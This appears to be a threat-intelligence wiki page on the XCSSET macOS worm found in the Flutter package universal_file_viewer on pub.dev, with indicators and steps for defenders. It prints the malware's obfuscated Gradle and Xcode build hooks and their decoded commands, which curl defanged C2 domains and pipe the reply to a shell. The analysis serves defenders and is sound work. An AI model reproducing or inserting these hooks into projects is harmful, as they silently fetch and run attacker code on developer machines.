# XCSSET hides inside a pub.dev Flutter package: `universal_file_viewer` (Aikido, Sep 8, 2026)

## Summary
On September 8, 2026 Aikido reported that **XCSSET** — the macOS build-hook worm — was found inside `universal_file_viewer` version **0.1.5** on **pub.dev**, the official package registry for Dart and Flutter. This is the first compromised package Aikido has detected on pub.dev. The package is a Flutter file-preview widget library (PDF, Word, Excel, video, Markdown, plain text) with roughly 500 downloads.

This was **not a targeted attack on the package or its dependents**. The XCSSET worm on the maintainer's infected machine spams malicious build hooks into every Android Gradle project, Xcode project, and Git repository it can find locally. When the maintainer published a new version from that machine, the infected files were shipped inside the tarball. The package traces back to a compromised GitHub repository, and Aikido notes that other maintainers were still pushing infected projects from the same worm at the time of the report.

## Tags
- ops
- operations
- XCSSET
- macOS
- pub.dev
- Dart
- Flutter
- supply-chain
- build-time compromise
- developer targeting
- source-repository poisoning
- worm
- credential theft

## Why this matters
- It extends XCSSET's reach into a **new package ecosystem** (Dart/Flutter / pub.dev), which historically had no XCSSET supply-chain precedent.
- It confirms the worm's propagation model is **endpoint-driven, not registry-driven**: the maintainer's workstation is the propagation point, and the package is just another build file the worm found. A clean dependency install does not prove the source repo was clean.
- It adds a **Flutter `example/` build-directory** lane to the list of build hooks defenders must diff: the payload lives in project files that ship in the tarball but are never compiled when the package is consumed as a library.

## Blast-radius nuance
- The package's Dart library code in `lib/` is **entirely clean**.
- The infected files are all inside the `example/` directory, which ships in the pub.dev tarball but is **never compiled when the package is used as a dependency**.
- Simply adding `universal_file_viewer` to a `pubspec.yaml` and building your own app **does not trigger** anything.
- The risk is to someone who **clones the repository and explicitly builds the `example/` app locally**. Most consumers of the package are not affected.

## The three infected build configurations
Each was injected independently by a different XCSSET worm module. All three fire at build time and reach XCSSET C2.

### 1. Android Gradle — `example/android/app/build.gradle.kts`
Injected by the `android_finder` module. A `preBuild` task runs a shell command on every Gradle build, with output discarded:
```kotlin
tasks.all {
    if (name.contains("preBuild")) {
        doLast {
            ProcessBuilder("sh", "-c", "((p(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f...0a | p | sh ) >/dev/null 2>&1 &)").start()
        }
    }
}
```
`printf xAxd | tr -d A` reconstructs `xxd` at runtime to defeat string-based scanners. The embedded hex blob decodes to:
```sh
echo "$(curl -sfkL --connect-timeout 30 --retry 5 -d "p=android_kotlin" https://5yotmxcc54l9xda[.]ru/a)" | sh
```
Campaign tag `p=android_kotlin`. Fires silently on every Gradle build.

### 2 and 3. iOS + macOS Xcode — `Runner.xcodeproj/project.pbxproj`
Both `example/ios/Runner.xcodeproj/project.pbxproj` and `example/macos/Runner.xcodeproj/project.pbxproj` contain a `PBXBuildRule` entry that fires when **any `.md` file** is processed during a build:
```
script = "cp \" ${INPUT_FILE_PATH} \" \"/tmp/ ${INPUT_FILE_BASE} \"\nsh -c \" ${A3EA261} \"";
```
`A3EA261` is a build setting defined in the same file, obfuscated differently per target:
- **iOS**: Base64-obfuscated via ``printf bdase64 | tr -d d`` (reconstructs `base64`), decodes to a `curl ... -d "p=xcode_rule" https://qdgs232i-q[.]ru/a | sh`.
- **macOS**: hex-obfuscated via ``printf xxVd | tr -d V`` (reconstructs `xxd`), decodes to a `curl ... -d "p=xcode_rule" https://ejntin6hkjt7gj2[.]ru/a | sh`.

Both fire at project build time. Campaign tag `p=xcode_rule`.

## Infection chain
XCSSET is a multi-stage, multi-module worm; each module does one thing. The build hook is only the entry point.
1. **Stage 1:** the build hook contacts C2 (`/a` with the `p=` tag) and receives a script that re-requests, now carrying the host OS and username.
2. **Stage 2:** the server returns a ciphered shell script that collects the hardware serial number and locale, downloads the main loader to `/tmp/h`, compiles an invisible app bundle around it, launches it, then deletes the staging.
3. **Subsequent stages:** the `mac_bin_daemon_app` binary, `sudo -u` privilege escalation, and `data_folders_finder` exfiltration to `/u` via multipart POST, with AES-256-CBC encryption.

This matches the v40 module set documented on the [XCSSET v40 campaign page](xcsset-v40-xcode-supply-chain-campaign.md) (memory-resident `boot` orchestrator, `data_folders_finder`, `replicator_finder`, `git_finder`, `zip_infect_finder`).

## Version remediation status (threat.wiki verification)
Aikido's report covers only 0.1.5. threat.wiki additionally pulled and inspected the subsequent pub.dev tarballs:
- **0.1.5** (the compromised release): all three hooks present — Android Gradle `preBuild` + iOS `PBXBuildRule` + macOS `PBXBuildRule`.
- **0.1.6**: the **Android Gradle `preBuild` hook is gone**, but the **iOS and macOS `PBXBuildRule` hooks are still infected** (same `A3EA261` obfuscated build settings, same C2 domains `qdgs232i-q[.]ru` and `ejntin6hkjt7gj2[.]ru`).
- **0.1.7**: no XCSSET markers found in any of the three build configurations.

Treat **0.1.5 and 0.1.6 as poisoned**; 0.1.7 appears clean at the time of this check but re-verify before relying on it, since the maintainer's machine was the infection source.

## High-value indicators
### Build-file markers
- `printf xAxd | tr -d A` (reconstructed `xxd`) inside `build.gradle.kts`
- `PBXBuildRule` with `sh -c "${A3EA261}"` plus an `A3EA261` build setting in `project.pbxproj`
- `printf bdase64 | tr -d d` (iOS) / `printf xxVd | tr -d V` (macOS) obfuscated build settings
- `.git/hooks/pre-commit` containing `base64 --decode | base64 --decode` or `xxd -p -r | xxd -p -r` (broader XCSSET worm signature)

### Infrastructure
- C2 domains: `5yotmxcc54l9xda[.]ru`, `qdgs232i-q[.]ru`, `ejntin6hkjt7gj2[.]ru` (all `/a` endpoints, `p=android_kotlin` / `p=xcode_rule` tags)
- Staging paths: `/tmp/h` (main loader), `/tmp/${INPUT_FILE_BASE}` (copied source file)

## Defender actions
1. **Do not trust the dependency install as clean.** If you (or a teammate) cloned the `universal_file_viewer` repository or any of the affected maintainer repositories and built the `example/` app locally, treat that host as potentially infected.
2. **Diff build files.** For the three configurations above, compare `build.gradle.kts`, `ios/Runner.xcodeproj/project.pbxproj`, and `macos/Runner.xcodeproj/project.pbxproj` against a known-good upstream revision. Look for the reconstructed-`xxd`/`base64` hooks and the `A3EA261` build setting.
3. **Hunt hosts that built these projects** for XCSSET host artifacts: `/tmp/h` and `/tmp/*.app` staging, `osascript` launch of an ad-hoc app bundle, `data_folders_finder` exfiltration to `/u`, the `mac_bin_daemon_app` daemon, and the rotating C2 domains.
4. **Block the C2 domains** and monitor the `p=android_kotlin` / `p=xcode_rule` URI patterns, but do not rely on static hashes — the loader and encrypted modules rotate.
5. **Re-verify 0.1.7** (and any new version) against the markers above before re-adopting the package; the maintainer's machine was the infection source, so assume the repo may be re-poisoned.
6. **Scope propagation**: inventory every Xcode/Git/Gradle project and ZIP archive the infected host touched; XCSSET's `replicator_finder`, `git_finder`, and `zip_infect_finder` turn a developer workstation into a source-repository propagation point.

## Assessment caveats
- The compromise is endpoint-driven: a single infected maintainer workstation is the root cause, not a targeted poisoning of the pub.dev registry.
- Only the `example/` build files are infected; the shipped `lib/` code is clean, so ordinary dependents are not at risk merely from adding the package.
- threat.wiki's 0.1.6/0.1.7 findings are from direct tarball inspection at check time and should be re-verified; the public Aikido report does not cover them.

## Related pages
- [XCSSET](../tools/xcsset.md)
- [XCSSET v40 Xcode supply-chain campaign](xcsset-v40-xcode-supply-chain-campaign.md)
- [Developer-tool config auto-execution](../patterns/developer-tool-config-auto-execution.md)

## Sources
- Aikido Security Research: [Compromised Flutter package on pub.dev contains XCSSET malware](https://www.aikido.dev/blog/compromised-flutter-package-on-pub-dev-contains-xcsset-malware) (Sep 8, 2026)
- Unit 42: [The Xcode Assassin Returns](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/) (context: XCSSET v40)
- Microsoft Security Blog XCSSET posts (March and September 2025, context)
